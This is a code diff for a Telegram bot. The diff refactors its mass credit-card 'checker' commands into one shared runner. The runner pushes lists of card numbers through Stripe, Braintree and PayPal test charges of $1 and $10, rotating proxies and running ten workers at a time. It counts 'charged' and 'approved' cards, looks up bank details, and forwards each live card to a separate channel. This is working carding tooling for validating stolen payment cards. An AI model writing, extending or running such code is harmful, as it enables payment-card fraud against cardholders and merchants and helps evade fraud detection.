@@ -3492,8 +3492,9 @@ async def _extract_mass_cards(event):
     cards.extend(extract_cc(raw_text))
     return list(dict.fromkeys(cards))
 
-@bot.on(events.NewMessage(pattern=r'^/mst1(?:\s+([\s\S]+))?$'))
-async def process_mst1_cmd(event):
+# ==================== UNIVERSAL ASYNC MASS CHECKER RUNNER ====================
+
+async def _run_generic_mass_check(event, gateway_name, check_func):
     user_id = event.sender_id
     if not is_admin(event.sender_id):
         await event.reply("Access denied.")
@@ -3501,155 +3502,221 @@ async def process_mst1_cmd(event):
 
     cards = await _extract_mass_cards(event)
     if not cards:
-        await event.reply("<b>Stripe Mass Charge 1 ($1.00)</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Usage:</b> Reply <code>/mst1</code> to a <code>.txt</code> file or send <code>/mst1 cc|mm|yy|cvv...</code>", parse_mode="html")
+        await event.reply(f"<b>{gateway_name}</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Usage:</b> Reply with command to a <code>.txt</code> file or send inline cards.", parse_mode="html")
         return
 
-    cards = cards[:100]
     proxies = load_proxies(user_id)
-    status_msg = await event.reply(f"<b>Mass Stripe $1 Check ({len(cards)})</b>\n<i>Processing (10 Workers)...</i>", parse_mode="html")
+    if not proxies:
+        await event.reply("⚠️ <b>No Active Proxies Found!</b>\nUse <code>/addproxy ip:port</code> first.", parse_mode="html")
+        return
 
+    total = len(cards)
+    charged = 0
+    approved = 0
+    declined = 0
+    errors = 0
+    checked_count = 0
+
+    session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    start_time_ts = time.time()
+    active_proxies_count = len(proxies)
+
+    paused_evt = asyncio.Event()
+    paused_evt.set()
+    MASS_SESSIONS[session_id] = {
+        "status": "CHECKING",
+        "paused_event": paused_evt,
+        "user_id": user_id
+    }
+
+    def make_progress_bar(pct, length=20):
+        filled = int(length * pct / 100)
+        return "[" + "=" * filled + " " * (length - filled) + "]"
+
+    control_buttons = [
+        [
+            Button.inline("Pause", f"chk_pause_{session_id}"),
+            Button.inline("Resume", f"chk_resume_{session_id}"),
+            Button.inline("Stop", f"chk_stop_{session_id}")
+        ]
+    ]
+
+    status_msg = await event.reply(f"""━━━━━━━━━━━━━━━━━━━━
+<b>Gateway</b> -> {gateway_name}
+<b>Status</b> -> CHECKING
+<b>Mode</b> -> Approved + Charged
+
+<b>PROGRESS</b>
+[                    ] 0%
+<b>Checked</b> -> 0/{total}
+<b>Approved</b> -> 0
+<b>CHARGED</b> -> 0
+<b>Dead</b> -> 0
+<b>Errors</b> -> 0
+<b>Time</b> -> 0s
+<b>Proxies</b> -> {active_proxies_count} / {active_proxies_count} active
+━━━━━━━━━━━━━━━━━━━━
+<b>Session ID</b> -> {session_id}""", buttons=control_buttons, parse_mode="html")
+
+    is_running = True
+
+    async def ui_ticker():
+        while is_running:
+            try:
+                await asyncio.sleep(3)
+                sess_info = MASS_SESSIONS.get(session_id)
+                if not sess_info:
+                    break
+
+                elapsed_sec = int(time.time() - start_time_ts)
+                mins, secs = divmod(elapsed_sec, 60)
+                time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+
+                pct = int((checked_count / total) * 100) if total > 0 else 0
+                pbar = make_progress_bar(pct)
+                current_st = sess_info.get("status", "CHECKING")
+
+                progress_ui = f"""━━━━━━━━━━━━━━━━━━━━
+<b>Gateway</b> -> {gateway_name}
+<b>Status</b> -> {current_st}
+<b>Mode</b> -> Approved + Charged
+
+<b>PROGRESS</b>
+{pbar} {pct}%
+<b>Checked</b> -> {checked_count}/{total}
+<b>Approved</b> -> {approved}
+<b>CHARGED</b> -> {charged}
+<b>Dead</b> -> {declined}
+<b>Errors</b> -> {errors}
+<b>Time</b> -> {time_str}
+<b>Proxies</b> -> {active_proxies_count} / {active_proxies_count} active
+━━━━━━━━━━━━━━━━━━━━
+<b>Session ID</b> -> {session_id}"""
+                await status_msg.edit(progress_ui, buttons=control_buttons, parse_mode="html")
+            except Exception:
+                pass
+
+    ticker_task = asyncio.create_task(ui_ticker())
     sem = asyncio.Semaphore(10)
-    results = []
 
     async def worker(card):
-        async with sem:
-            proxy = random.choice(proxies) if proxies else None
-            try:
-                st, msg, code = await check_card_stripe_1(card, proxy_url=proxy)
-                results.append(f"<code>{card}</code> -> {st.upper()} ({msg})")
-            except Exception as e:
-                results.append(f"<code>{card}</code> -> ERROR ({str(e)[:30]})")
+        nonlocal checked_count, charged, approved, declined, errors
+        sess_info = MASS_SESSIONS.get(session_id)
+        if not sess_info or sess_info["status"] == "STOPPED":
+            return
 
-    tasks = [worker(card) for card in cards]
+        await sess_info["paused_event"].wait()
+        if sess_info["status"] == "STOPPED":
+            return
+
+        async with sem:
+            if MASS_SESSIONS.get(session_id, {}).get("status") == "STOPPED":
+                return
+            try:
+                proxy = random.choice(proxies) if proxies else None
+                st, msg, brand = await check_func(card, proxy)
+                st_lower = str(st).lower()
+
+                if st_lower in ('charged', 'approved', 'live'):
+                    if st_lower == 'charged':
+                        charged += 1
+                    else:
+                        approved += 1
+
+                    cc_num = card.split('|')[0]
+                    bin_brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
+                    status_emoji = "Approved! ✅ -» charged!" if st_lower == 'charged' else "Approved! ✅"
+                    hit_msg = format_anime_result(card, status_emoji, msg, gateway_name, bin_brand or brand, bin_type, level, bank, country, flag, "Live", event.sender)
+                    await event.reply(hit_msg, parse_mode="html")
+
+                    try:
+                        await bot.send_message("Fchker", hit_msg, parse_mode="html")
+                    except Exception:
+                        pass
+                elif st_lower in ('error', 'timeout'):
+                    errors += 1
+                else:
+                    declined += 1
+            except Exception:
+                errors += 1
+            finally:
+                checked_count += 1
+
+    tasks = [worker(c) for c in cards]
     await asyncio.gather(*tasks)
 
-    out_text = "\n".join(results[:50])
-    if len(results) > 50:
-        out_text += f"\n\n<i>Showing first 50 of {len(results)} results</i>"
+    is_running = False
+    ticker_task.cancel()
 
-    res = f"<b>Mass Stripe $1 Results ({len(cards)})</b>\n" + out_text
-    await status_msg.edit(res, parse_mode="html")
+    elapsed_sec = int(time.time() - start_time_ts)
+    mins, secs = divmod(elapsed_sec, 60)
+    time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+    final_st = MASS_SESSIONS.get(session_id, {}).get("status", "COMPLETE")
+    if final_st == "CHECKING":
+        final_st = "COMPLETE"
+
+    final_ui = f"""━━━━━━━━━━━━━━━━━━━━
+<b>Gateway</b> -> {gateway_name}
+<b>Status</b> -> {final_st}
+<b>Mode</b> -> Approved + Charged
+
+<b>SUMMARY</b>
+<b>Total Checked</b> -> {checked_count}/{total}
+<b>Approved</b> -> {approved}
+<b>CHARGED</b> -> {charged}
+<b>Dead</b> -> {declined}
+<b>Errors</b> -> {errors}
+<b>Time</b> -> {time_str}
+━━━━━━━━━━━━━━━━━━━━
+<b>Session ID</b> -> {session_id}"""
+
+    try:
+        await status_msg.edit(final_ui, parse_mode="html")
+    except:
+        pass
+
+    MASS_SESSIONS.pop(session_id, None)
+
+
+@bot.on(events.NewMessage(pattern=r'^/mst1(?:\s+([\s\S]+))?$'))
+async def process_mst1_cmd(event):
+    async def run_mst1(card, proxy):
+        st, msg, code = await check_card_stripe_1(card, proxy_url=proxy)
+        return st, msg, "Stripe"
+    await _run_generic_mass_check(event, "Stripe Mass Charge 1 ($1.00)", run_mst1)
+
 
 @bot.on(events.NewMessage(pattern=r'^/mst6(?:\s+([\s\S]+))?$'))
 async def process_mst6_cmd(event):
-    user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
-        return
+    async def run_mst6(card, proxy):
+        parts = card.split("|")
+        if len(parts) >= 4:
+            st, msg, brand = await check_card_bloomerang(parts[0], parts[1], parts[2], parts[3], proxy_url=proxy)
+            return st, msg, brand
+        return "declined", "Invalid Card Format", "Unknown"
+    await _run_generic_mass_check(event, "Stripe Mass Charge 2 ($1.00)", run_mst6)
 
-    cards = await _extract_mass_cards(event)
-    if not cards:
-        await event.reply("<b>Stripe Mass Charge 2 ($1.00)</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Usage:</b> Reply <code>/mst6</code> to a <code>.txt</code> file or send <code>/mst6 cc|mm|yy|cvv...</code>", parse_mode="html")
-        return
-
-    cards = cards[:100]
-    proxies = load_proxies(user_id)
-    status_msg = await event.reply(f"<b>Mass Stripe $1 Check ({len(cards)})</b>\n<i>Processing (10 Workers)...</i>", parse_mode="html")
-
-    sem = asyncio.Semaphore(10)
-    results = []
-
-    async def worker(card):
-        async with sem:
-            parts = card.split("|")
-            if len(parts) >= 4:
-                proxy = random.choice(proxies) if proxies else None
-                try:
-                    st, msg, brand = await check_card_bloomerang(parts[0], parts[1], parts[2], parts[3], proxy_url=proxy)
-                    results.append(f"<code>{card}</code> -> {st.upper()} ({msg})")
-                except Exception as e:
-                    results.append(f"<code>{card}</code> -> ERROR ({str(e)[:30]})")
-
-    tasks = [worker(card) for card in cards]
-    await asyncio.gather(*tasks)
-
-    out_text = "\n".join(results[:50])
-    if len(results) > 50:
-        out_text += f"\n\n<i>Showing first 50 of {len(results)} results</i>"
-
-    res = f"<b>Mass Stripe $1 Results ({len(cards)})</b>\n" + out_text
-    await status_msg.edit(res, parse_mode="html")
 
 @bot.on(events.NewMessage(pattern=r'^/mbt1(?:\s+([\s\S]+))?$'))
 async def process_mbt1_cmd(event):
-    user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
-        return
-
-    cards = await _extract_mass_cards(event)
-    if not cards:
-        await event.reply("<b>Braintree Mass Charge ($1.00)</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Usage:</b> Reply <code>/mbt1</code> to a <code>.txt</code> file or send <code>/mbt1 cc|mm|yy|cvv...</code>", parse_mode="html")
-        return
-
-    cards = cards[:100]
-    proxies = load_proxies(user_id)
-    status_msg = await event.reply(f"<b>Mass Braintree $1 Check ({len(cards)})</b>\n<i>Processing (10 Workers)...</i>", parse_mode="html")
-
-    sem = asyncio.Semaphore(10)
-    results = []
-
-    async def worker(card):
-        async with sem:
-            parts = card.split("|")
-            if len(parts) >= 4:
-                proxy = random.choice(proxies) if proxies else None
-                try:
-                    st, msg, code = await check_card_braintree_1(parts[0], parts[1], parts[2], parts[3], proxy=proxy)
-                    results.append(f"<code>{card}</code> -> {st.upper()} ({msg})")
-                except Exception as e:
-                    results.append(f"<code>{card}</code> -> ERROR ({str(e)[:30]})")
-
-    tasks = [worker(card) for card in cards]
-    await asyncio.gather(*tasks)
-
-    out_text = "\n".join(results[:50])
-    if len(results) > 50:
-        out_text += f"\n\n<i>Showing first 50 of {len(results)} results</i>"
-
-    res = f"<b>Mass Braintree $1 Results ({len(cards)})</b>\n" + out_text
-    await status_msg.edit(res, parse_mode="html")
+    async def run_mbt1(card, proxy):
+        parts = card.split("|")
+        if len(parts) >= 4:
+            st, msg, code = await check_card_braintree_1(parts[0], parts[1], parts[2], parts[3], proxy=proxy)
+            return st, msg, "Braintree"
+        return "declined", "Invalid Card Format", "Unknown"
+    await _run_generic_mass_check(event, "Braintree Mass Charge ($1.00)", run_mbt1)
 
 
 @bot.on(events.NewMessage(pattern=r'^/mpp2(?:\s+([\s\S]+))?$'))
 async def process_mpp2_cmd(event):
-    user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
-        return
-
-    cards = await _extract_mass_cards(event)
-    if not cards:
-        await event.reply("<b>PayPal Mass Charge ($10.00)</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Usage:</b> Reply <code>/mpp2</code> to a <code>.txt</code> file or send <code>/mpp2 cc|mm|yy|cvv...</code>", parse_mode="html")
-        return
-
-    cards = cards[:100]
-    proxies = load_proxies(user_id)
-    status_msg = await event.reply(f"<b>Mass PayPal $10 Check ({len(cards)})</b>\n<i>Processing (10 Workers)...</i>", parse_mode="html")
-
-    sem = asyncio.Semaphore(10)
-    results = []
-
-    async def worker(card):
-        async with sem:
-            parts = card.split("|")
-            if len(parts) >= 4:
-                proxy = random.choice(proxies) if proxies else None
-                try:
-                    st, msg, brand = await check_card_paypal_lounsbury(parts[0], parts[1], parts[2], parts[3], proxy_url=proxy)
-                    results.append(f"<code>{card}</code> -> {st.upper()} ({msg})")
-                except Exception as e:
-                    results.append(f"<code>{card}</code> -> ERROR ({str(e)[:30]})")
-
-    tasks = [worker(card) for card in cards]
-    await asyncio.gather(*tasks)
-
-    out_text = "\n".join(results[:50])
-    if len(results) > 50:
-        out_text += f"\n\n<i>Showing first 50 of {len(results)} results</i>"
-
-    res = f"<b>Mass PayPal $10 Results ({len(cards)})</b>\n" + out_text
-    await status_msg.edit(res, parse_mode="html")
+    async def run_mpp2(card, proxy):
+        parts = card.split("|")
+        if len(parts) >= 4:
+            st, msg, brand = await check_card_paypal_lounsbury(parts[0], parts[1], parts[2], parts[3], proxy_url=proxy)
+            return st, msg, brand
+        return "declined", "Invalid Card Format", "Unknown"
+    await _run_generic_mass_check(event, "PayPal Mass Charge ($10.00)", run_mpp2)
 
 
 
